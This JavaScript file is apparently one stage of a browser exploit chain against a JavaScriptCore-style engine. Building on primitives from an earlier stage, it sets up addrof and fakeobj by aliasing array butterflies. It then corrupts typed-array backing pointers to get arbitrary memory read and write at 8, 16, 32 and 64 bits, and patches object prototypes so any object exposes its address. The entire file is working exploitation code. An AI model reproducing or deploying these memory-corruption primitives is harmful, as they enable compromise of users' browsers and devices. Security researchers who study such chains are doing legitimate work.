// Pointer utility
// NOTE: only use after stage0.

stages.push(() => {
  const rwd = [],
    rwo = [];
    
  rwd[0] = 3.14;
  rwo[0] = rwd;

  const rw_butterfly = primitives._read64(primitives.addrof(rwd).add(0x8));
  primitives._writeDouble(primitives.addrof(rwo).add(0x8), rw_butterfly);

  printf(`New fakeobj/addrof objects created!`, 2);

  /**
   * Leaks the address of the object passed in.
   * @param {Object} object The object to leak the address of.
   * @returns {Int64} The address as an Int64 object.
   */
  Memory.addrof = function (object = Memory) {
    rwo[0] = object;
    return new Int64(rwd[0]);
  };

  /**
   * Creates a JSObject from metadata. Metadata should have two
   * inline fields, the first representing the JSCell, and the
   * second representing the butterfly. Usually the butterfly
   * not a pointer to the butterfly (as it gets boxed).
   * @param {Int64} metadata_address Address to a valid JSObject
   * representation.
   * @returns {Object} The casted object.
   */
  Memory.fakeobj = function (metadata_address) {
    rwd[0] = metadata_address.asDouble();
    return rwo[0];
  };


  /**
   * Prototype utilities
   */

  // address->object
  Object.defineProperty(Object.prototype, "address", {
    get: function () {
      return Memory.addrof(this);
    }
  });

  // address->object
  Object.defineProperty(Int64.prototype, "object", {
    get: function () {
      return Memory.fakeobj(this);
    }
  });

  printf(`Memory Utility @ ${Memory.address}`, 2);

  const operationTypes = [8, 16, 32, 64];
  const operator_m_buffer_low = 4;
  const operator_m_buffer_high = 5;
  const pointers = {};
  const operators = {};

  function _generateBackingsWithType(type) {
    const is64 = type == "64";
    const fixedType = !is64 ? type : "32";
    const maxPointerLen = 0x6;
    const m_buffer_offset = 0x10;

    let pointer = primitives._spawnObject(Uint32Array, [maxPointerLen]);
    let operator = primitives._spawnObject(
      globalThis[`Uint${fixedType}Array`],
      [1]
    );

    primitives._write64(pointer.address.add(m_buffer_offset), operator);

    const name = `uint${type}`;
    pointers[name] = pointer;
    operators[name] = operator;

    return true;
  }

  function _generateOperation(type) {
    const is64 = type == "64";
    const pointer = pointers[`uint${type}`];
    const operator = operators[`uint${type}`];

    const _set_buffers = (addr) => {
      pointer[operator_m_buffer_low] = addr.low;
      pointer[operator_m_buffer_high] = addr.high;
    };

    const _enter_scope = (addr, scoped) => {
      _set_buffers(addr);
      let _ = scoped();
      _set_buffers(Int64.Zero);
      return _;
    };

    // Read Op
    Memory[`read${type}`] = function (address) {
      return _enter_scope(address, () => {
        // Why is operator[0] 64 bit?
        let val = new Int64(operator[0]);
        if (is64) return val;
        return new Int64(val[`asInt${type}`]());
      });
    };

    // Write Op
    Memory[`write${type}`] = function (address, value) {
      return _enter_scope(address, () => {
        if (!is64) operator[0] = value.low[`asInt${type}`]();
        else {
          operator[0] = value.low.asInt32();
          operator[1] = value.high.asInt32();
        }
      });
    };

    return true;
  }

  for (const f of [_generateBackingsWithType, _generateOperation])
    operationTypes.every(f);
  
  printf(`Generated memory operations!`, 2)

  // printf(Memory.read8(Memory.address));
  // printf(Memory.read16(Memory.address));
  // printf(Memory.read32(Memory.address));
  // printf(Memory.read64(Memory.address));

  // let header = Memory.read64(Memory.address);

  // Memory.write64(Memory.address, header)
  // printf(Memory.read64(Memory.address)); // Broken as operator[]
});
